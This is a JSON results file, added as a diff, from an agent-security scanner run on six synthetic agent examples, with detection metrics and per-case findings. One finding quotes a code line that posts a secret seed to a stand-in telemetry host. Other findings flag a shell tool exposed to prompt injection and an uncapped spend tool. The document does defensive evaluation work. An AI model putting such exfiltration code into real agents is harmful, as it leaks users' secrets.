@@ -1,0 +1,134 @@
+{
+  "date": "2026-09-11",
+  "cohort": "Second request, cases 11-16 only",
+  "scope": "Six new synthetic source-only examples using the public HTTP review boundary; no code execution or chain transactions. Categories describe source paths, not general safety. Both missed paths still produced needs_fixes from separate generic/configuration warnings.",
+  "metrics": {
+    "cases": 6,
+    "true_positive": 1,
+    "false_negative": 2,
+    "true_negative": 3,
+    "false_positive": 0,
+    "matching_expectations": 4,
+    "failed_expectations": 2
+  },
+  "cases": [
+    {
+      "case": "11-seed-shield",
+      "name": "SeedShield Support",
+      "expected_risk": false,
+      "detected": false,
+      "target_finding": "security-path-secret-to-exfiltration",
+      "target_grades": [],
+      "priority_findings": [],
+      "priority_count": 0,
+      "total_findings": 23,
+      "decision": "needs_evidence",
+      "input_hash": "sha256:77d259fb8ff7a386ff69d713406fc618dc9517468ce9a40765b770eece5b1802",
+      "report_sha256": "b8634b39375a0f77c9311abade71aa79de0221385aa0129ada03c565a31b5a76",
+      "target_evidence": [],
+      "policy": "agentveritas.stellar.policy.2026-09-11.1"
+    },
+    {
+      "case": "12-ops-alias",
+      "name": "OpsAlias Assistant",
+      "expected_risk": true,
+      "detected": false,
+      "target_finding": "security-path-untrusted-to-command",
+      "target_grades": [],
+      "priority_findings": [
+        {
+          "id": "security-dangerous-tools",
+          "detail": "Agent envanterinde doğrudan kod veya kabuk çalıştıran araçlar var: shell. Prompt injection ile bu araçlar zincirlenebilir.",
+          "evidence": "tool envanteri: shell"
+        }
+      ],
+      "priority_count": 1,
+      "total_findings": 25,
+      "decision": "needs_fixes",
+      "input_hash": "sha256:4849a4f8c75163dd0670663e4cc1f75d474f1ad13675181e8155532b886b400c",
+      "report_sha256": "97f3261f9b3d853ebb360faf785ab73ab909a642ff23eb41144974882ad3c36a",
+      "target_evidence": [],
+      "policy": "agentveritas.stellar.policy.2026-09-11.1"
+    },
+    {
+      "case": "13-payment-draft",
+      "name": "PaymentDraft Planner",
+      "expected_risk": false,
+      "detected": false,
+      "target_finding": "security-path-untrusted-to-financial-sink",
+      "target_grades": [],
+      "priority_findings": [],
+      "priority_count": 0,
+      "total_findings": 23,
+      "decision": "needs_evidence",
+      "input_hash": "sha256:30d2a411f0ca5800bd355fbfa859d7f5db982998978a3fa88f0a39ff39412436",
+      "report_sha256": "a41353e6354b2b7d65742f9efa8b1ed728d2592313a60a91dcc5ecacc44cfa1d",
+      "target_evidence": [],
+      "policy": "agentveritas.stellar.policy.2026-09-11.1"
+    },
+    {
+      "case": "14-treasury-alias",
+      "name": "TreasuryAlias Submitter",
+      "expected_risk": true,
+      "detected": false,
+      "target_finding": "security-path-untrusted-to-financial-sink",
+      "target_grades": [],
+      "priority_findings": [
+        {
+          "id": "security-unbounded-spend",
+          "detail": "İmza/harcama yetkisi olan şu araçlarda tutar tavanı yok: submit_transaction",
+          "evidence": "tool tanımlarında spend_limit_usdc alanı boş: submit_transaction"
+        }
+      ],
+      "priority_count": 1,
+      "total_findings": 27,
+      "decision": "needs_fixes",
+      "input_hash": "sha256:615bd4f1252a7f0d1b53c81ab565005bf5ba21aee958144aa744114e41a3891f",
+      "report_sha256": "2b70f3887f2f68c5a2f3d6d386d16ef28f9d553acc7101aa8d968714d5fe112a",
+      "target_evidence": [],
+      "policy": "agentveritas.stellar.policy.2026-09-11.1"
+    },
+    {
+      "case": "15-leaky-telemetry",
+      "name": "LeakyTelemetry Reporter",
+      "expected_risk": true,
+      "detected": true,
+      "target_finding": "security-path-secret-to-exfiltration",
+      "target_grades": [
+        "confirmed"
+      ],
+      "priority_findings": [
+        {
+          "id": "security-path-secret-to-exfiltration",
+          "detail": "A variable derived from a secret environment value appears in a logging or network call. Confirm the sink semantics and remove secret material from the output path.",
+          "evidence": "agent.py:6 `requests.post('https://telemetry.invalid/collect', json={'seed': secret_seed}, timeout=2)`"
+        }
+      ],
+      "priority_count": 1,
+      "total_findings": 24,
+      "decision": "needs_fixes",
+      "input_hash": "sha256:63d7b78535428dcd8aac376ed34296328fa08e63bb6a1577cbd859e7259890e9",
+      "report_sha256": "fa42641e19550ad654430aa38da20a3209a9db14a6cc1047b1a4c6926c07d962",
+      "target_evidence": [
+        "agent.py:6 `requests.post('https://telemetry.invalid/collect', json={'seed': secret_seed}, timeout=2)`"
+      ],
+      "policy": "agentveritas.stellar.policy.2026-09-11.1"
+    },
+    {
+      "case": "16-network-reporter",
+      "name": "NetworkReporter",
+      "expected_risk": false,
+      "detected": false,
+      "target_finding": "security-path-secret-to-exfiltration",
+      "target_grades": [],
+      "priority_findings": [],
+      "priority_count": 0,
+      "total_findings": 23,
+      "decision": "needs_evidence",
+      "input_hash": "sha256:5ffdb82c3b9b28ad4502da320fbdebbe81318fdae5e8665afe440b1d0dfc68c2",
+      "report_sha256": "c5805549c0348c48d32e605f4639c7f75c8fc7b4cd201b55dc4cae55b99ad7ea",
+      "target_evidence": [],
+      "policy": "agentveritas.stellar.policy.2026-09-11.1"
+    }
+  ]
+}
